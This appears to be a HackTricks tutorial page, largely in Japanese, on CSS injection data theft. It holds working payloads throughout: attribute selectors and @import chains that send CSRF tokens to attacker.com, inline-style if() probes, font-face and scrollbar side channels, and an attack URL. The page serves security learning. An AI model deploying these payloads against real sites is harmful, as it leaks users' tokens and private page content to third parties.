# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### 属性セレクタ

CSSセレクタは、`input` 要素の `name` と `value` 属性の値にマッチするよう作成されます。もし `input` 要素の `value` 属性が特定の文字で始まると、あらかじめ定義された外部リソースが読み込まれます：
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
しかし、この手法は隠し input 要素（`type="hidden"`）に対して制約があり、隠し要素は背景を読み込まないため問題になります。

#### 隠し要素のバイパス

この制約を回避するには、`~` を使った一般兄弟セレクタで後続の兄弟要素をターゲットにします。するとその CSS ルールは隠し input 要素に続くすべての兄弟要素に適用され、背景画像を読み込ませます:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
この手法を実際に悪用する実例は、添付のコードスニペットに詳述されています。閲覧は [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e) から可能です。

#### CSS Injection の前提条件

CSS Injection を有効にするには、いくつかの条件を満たす必要があります:

1. **Payload Length**: CSS injection vector は、作成したセレクタを格納するのに十分な長さのpayloadをサポートしている必要があります。
2. **CSS Re-evaluation**: ページをフレーム内に読み込める能力が必要です。これは、新たに生成したpayloadを用いてCSSの再評価をトリガーするために必要です。
3. **External Resources**: この手法は外部ホストされた画像を使用できることを前提としています。これはサイトの Content Security Policy (CSP) によって制限される可能性があります。

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), セレクタ **`:has`** と **`:not`** を組み合わせることで、ブラインド要素からでもコンテンツを識別することが可能です。これは、CSS Injection を読み込むウェブページの内部が全く分からない場合に非常に有用です。\
これらのセレクタを使って、同じタイプの複数のブロックから情報を抽出することも可能です。例えば:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
次の**@import**テクニックと組み合わせることで、多くの**CSS injectionを使ったblind pagesからの情報のエクスフィルトレーションを** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**が可能です。**

### @import

前のテクニックにはいくつか欠点があるので、前提条件を確認してください。あなたは**send multiple links to the victim**できるか、あるいは**iframe the CSS injection vulnerable page**できる必要があります。

しかし、品質を向上させるために**CSS `@import`**を利用する別の巧妙な手法があります。

これは最初に[**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)によって示され、動作は次の通りです:

同じページを何度も読み込み、毎回何十もの異なるpayloadを使うのではなく（前の手法のように）、ページを一度だけ読み込み、**load the page just once and just with an import to the attackers server**（this is the payload to send to the victim）：
```css
@import url("//attacker.com:5001/start?");
```
1. importはattackersから**CSSスクリプトを受け取り**、**browserがそれを読み込みます**。
2. attackerが送るCSSスクリプトの最初の部分は**さらに別の`@import`でattackers serverへ向けられます。**
1. attackers serverはまだこのリクエストに応答しません。なぜならいくつかの文字をleakしてから、このimportに対して次の文字をleakするためのpayloadで応答したいからです。
3. payloadの第二部でより大きい部分は**attribute selector leakage payload**になります
1. これはattackers serverに**secretの最初のcharと最後のchar**を送信します
4. attackers serverが**secretの最初と最後のchar**を受け取ると、**ステップ2で要求されたimportに応答します**。
1. 応答は**ステップ2, 3, 4**と全く同じになりますが、今回は**secretの2番目のcharと最後から2番目を見つけようと**します。

attackerはそのループを**続け、secretを完全にleakするまで**回します。

元の[**Pepe Vilaのこの問題を悪用するためのコードはこちら**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)、あるいはほぼ[**同じコード（コメント付き）はこちら**](#css-injection)を参照できます。

> [!TIP]
> スクリプトは各回に2文字（先頭と末尾から）を発見しようとします。これはattribute selectorが以下のようなことを可能にするためです：
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> これによりスクリプトはsecretをより速くleakできます。

> [!WARNING]
> スクリプトは時々、発見されたprefix + suffixが既に完全なflagであることを**正しく検出できない**ことがあり、そのため前方（prefix側）および後方（suffix側）に進み続け、最終的にハングすることがあります。\
> 心配いりません、**output**を確認すれば**そこにflagが表示されています**。

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: 要素のstyle属性を制御し、ターゲット属性が同じ要素上にあることを保証します（attr()は同一要素の属性のみを読み取ります）。
- Read: 属性をCSS変数にコピーします: `--val: attr(title)`.
- Decide: 変数を文字列候補と比較するネストされた条件式を使ってURLを選択します: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: 選択したエンドポイントへのリクエストを強制するために、`background: image-set(var(--steal))`（または任意のリクエストを発生させるプロパティ）を適用します。

Attempt（動作しません；比較でシングルクォートを使用している）:
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
動作するペイロード（比較時はダブルクォートが必要）:
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
ネストされた条件で属性値を列挙する:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
現実的なデモ (probing usernames):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
注意点と制限:

- 調査時点では Chromiumベースのブラウザで動作します。他のエンジンでは挙動が異なる可能性があります。
- 有限/列挙可能な値空間（IDs, flags, short usernames）に最適です。外部スタイルシートを使わずに任意の長い文字列を盗むのは依然として困難です。
- URLをフェッチする任意のCSSプロパティがリクエストをトリガーするために使えます（例: background/image-set, border-image, list-style, cursor, content）。

Automation: a Burp Custom Action can generate nested inline-style payloads to brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### その他のセレクタ

DOMの一部にアクセスする他の方法（**CSS selectors**）:

- **`.class-to-search:nth-child(2)`**: DOM内でクラス "class-to-search" を持つ2番目の要素を検索します。
- **`:empty`** selector: Used for example in [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

全体的な意図は、**制御されたエンドポイントからカスタムフォントを使用し**、指定されたリソース（`favicon.ico`）が読み込めない場合に限り**テキスト（この場合は 'A'）がそのフォントで表示されるようにする**ことです。
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **カスタムフォントの利用**:

- `<head>` セクションの `<style>` タグ内で `@font-face` ルールを使用してカスタムフォントが定義されています。
- フォントは `poc` と名付けられ、外部エンドポイント（`http://attacker.com/?leak`）から取得されます。
- `unicode-range` プロパティは `U+0041` に設定され、特定の Unicode 文字 'A' を対象とします。

2. **フォールバックテキストを持つ Object 要素**:
- `<body>` セクションに `id="poc0"` を持つ `<object>` 要素が作成されます。この要素は `http://192.168.0.1/favicon.ico` からリソースの読み込みを試みます。
- この要素の `font-family` は `<style>` セクションで定義された通り `'poc'` に設定されています。
- リソース（`favicon.ico`）の読み込みに失敗した場合、`<object>` タグ内のフォールバックコンテンツ（文字 'A'）が表示されます。
- 外部リソースが読み込めない場合、フォールバックコンテンツ（'A'）はカスタムフォント `poc` を使用してレンダリングされます。

### Scroll-to-Text フラグメントのスタイリング

**`:target`** 疑似クラスは、[CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo) に記載されている通り、**URL fragment** によってターゲットされた要素を選択するために使用されます。`::target-text` は、フラグメントによってテキストが明示的にターゲットされない限り、いかなる要素にもマッチしないことを理解することが重要です。

攻撃者が **Scroll-to-text** フラグメント機能を悪用すると、HTML インジェクションを通じて自身のサーバーからリソースを読み込ませることで、ウェブページ上に特定のテキストが存在するかを確認できるというセキュリティ上の懸念が生じます。この手法では、以下のような CSS ルールを注入します：
```css
:target::before {
content: url(target.png);
}
```
このようなシナリオでは、ページに "Administrator" というテキストが存在する場合、リソース `target.png` がサーバーにリクエストされ、そのテキストが存在することが示されます。注入された CSS を Scroll-to-text fragment とともに埋め込んだ特殊に作成した URL を使って、この攻撃の一例を実行できます:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
ここでは、攻撃が HTML インジェクションを操作して CSS コードを送信し、Scroll-to-text fragment (`#:~:text=Administrator`) を介して特定のテキスト「Administrator」を狙います。該当するテキストが見つかると、指定されたリソースが読み込まれ、結果として攻撃者にその存在を通知してしまいます。

軽減策として、次の点に注意してください：

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) は単語または文のみをマッチするように設計されており、そのため任意のシークレットやトークンをleakする能力が制限されます。
2. **Restriction to Top-level Browsing Contexts**: STTF はトップレベルのブラウジングコンテキストでのみ動作し、iframe 内では機能しないため、悪用の試みはユーザーにとってより目立ちやすくなります。
3. **Necessity of User Activation**: STTF は動作に user-activation ジェスチャを必要とするため、悪用はユーザー主導のナビゲーションを通じてのみ現実的です。この要件により、ユーザー操作なしに攻撃が自動化されるリスクは大幅に軽減されます。とはいえ、ブログ記事の著者は特定の条件やバイパス（例: social engineering、一般的な browser extensions との相互作用）によって攻撃の自動化が容易になる可能性を指摘しています。

これらの仕組みと潜在的な脆弱性を認識することが、Web セキュリティの維持およびこうした悪用手法からの保護に重要です。

For more information check the original report: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

You can check an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

特定の Unicode 値に対して **外部フォント** を指定でき、これらの Unicode 値がページに存在する場合にのみそのフォントが取得されます。例えば：
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

説明されている手法は、font ligatures を悪用してノードからテキストを抽出し、幅の変化を監視することでテキストを読み取るものです。プロセスは以下のようなステップで構成されます：

1. **Creation of Custom Fonts**:

- SVG フォントは、`horiz-adv-x` 属性を持つグリフで作成されます。この属性は 2 文字のシーケンスを表すグリフに大きな幅を設定します。
- 例の SVG グリフ: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`。ここで "XY" は 2 文字のシーケンスを示します。
- これらのフォントは fontforge を使用して woff 形式に変換されます。

2. **Detection of Width Changes**:

- CSS を使用してテキストの折り返しを禁止（`white-space: nowrap`）し、スクロールバーのスタイルをカスタマイズします。
- 独特のスタイルが適用された水平スクロールバーの出現は、特定の ligature（つまり特定の文字列）がテキスト内に存在することを示す指標（オラクル）として機能します。
- 関連する CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: 幅の大きい文字ペア用のフォントを作成します。
- **Step 2**: スクロールバーを利用したトリックで、幅の大きいグリフ（文字ペアの ligature）がレンダリングされたことを検出し、該当する文字列の存在を確認します。
- **Step 3**: ligature を検出したら、検出したペアに前後の文字を追加した 3 文字シーケンスを表す新しいグリフを生成します。
- **Step 4**: その 3 文字 ligature の検出を行います。
- **Step 5**: このプロセスを繰り返し、テキスト全体を段階的に明らかにしていきます。

4. **Optimization**:
- 現在の `<meta refresh=...` を使った初期化方法は最適とは言えません。
- より効率的な方法として CSS の `@import` トリックを用いることで、エクスプロイトの性能を向上させることができます。

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). ブラウザにインストールされたデフォルトフォントを使用して、テキストノードで使われている charset を leak することができます：外部フォントやカスタムフォントは不要です。

この手法は、アニメーションを使って `div` の幅を段階的に拡張し、テキストの 'suffix' 部分から 'prefix' 部分へ一文字ずつ移動させることで機能します。これによりテキストは次の2つのセクションに分割されます：

1. Prefix: 最初の行
2. Suffix: 続く行（複数行）

文字の遷移段階は次のようになります：

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

この遷移中に、**unicode-range trick** を利用して、prefix に加わる各文字を識別します。具体的にはフォントを Comic Sans に切り替えることで、その文字がデフォルトフォントより明らかに大きくなり、縦スクロールバーが発生します。このスクロールバーの出現によって、prefix に新しい文字が存在することが間接的に明らかになります。

この方法では新しく現れるユニークな文字を検出できますが、どの文字が重複しているかまでは特定できず、重複が発生したということのみが分かります。

> [!TIP]
> 基本的に、**unicode-range は文字を検出するために使用されます** が、外部フォントを読み込みたくないため別の方法を用意する必要があります。\
> 文字が見つかると、その文字には事前インストールされた **Comic Sans font** が適用され、文字が大きくなってスクロールバーが発生します。これにより、見つかった文字が **leak** されます。

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照：** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

このケースは前のケースと非常に似ていますが、ここでは特定の **chars を他の文字より大きくして何か（例えば bot に押されないようにするボタンや読み込まれない image）を隠す** ことが目的です。そうすることで、そのアクション（あるいは不作動）を計測して、特定の char がテキスト内に存在するかどうかを判別できます。

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照：** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

この場合は、同一オリジンから fake font を読み込んで、テキストに特定の char があるかどうかを leak しようと試みることができます:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
一致した場合、**フォントは `/static/bootstrap.min.css?q=1` から読み込まれます**。実際には正常に読み込まれないことが多いですが、**ブラウザはそれをキャッシュするはず**で、キャッシュが無くても **304 not modified** が働くため、**レスポンスは他のリクエストより速くなるはずです**。

ただし、キャッシュ済みレスポンスと未キャッシュのレスポンスの時間差が十分でなければ、有効ではありません。例えば著者は次のように述べています: テストしたところ、第一の問題は速度差があまりないことで、第二の問題はボットが `disk-cache-size=1` フラグを使っていることで、かなり配慮されているという点です。

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

この場合、マッチ時に同一オリジンから数百の偽フォントを読み込むような**CSS を指定**できます。こうして読み込みにかかる時間を**計測**し、ある文字が出現するかどうかを次のように判別できます:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
そしてボットのコードは次のとおりです:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
したがって、フォントが一致しない場合、ボットにアクセスした際の応答時間は約30秒になると予想されます。しかし、フォントが一致する場合は、フォントを取得するために複数のリクエストが送信され、ネットワークに継続的な活動が発生します。その結果、停止条件を満たしてレスポンスを受け取るまでに時間がかかります。したがって、応答時間はフォントが一致するかどうかを判断する指標として利用できます。

## 参考文献

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
